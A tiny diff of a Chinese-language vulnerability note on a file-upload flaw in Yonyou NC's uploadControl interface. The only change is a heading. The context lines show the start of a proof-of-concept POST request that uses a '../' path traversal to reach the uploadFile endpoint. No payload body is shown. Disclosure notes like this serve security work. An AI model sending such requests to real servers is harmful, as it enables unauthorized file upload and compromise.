@@ -1,7 +1,7 @@
 ## 用友NC-uploadControl接口存在文件上传漏洞
 
 
-## poc
+## POC
 ```
 POST /mp/login/../uploadControl/uploadFile HTTP/1.1
 Host: 192.168.63.133:8088
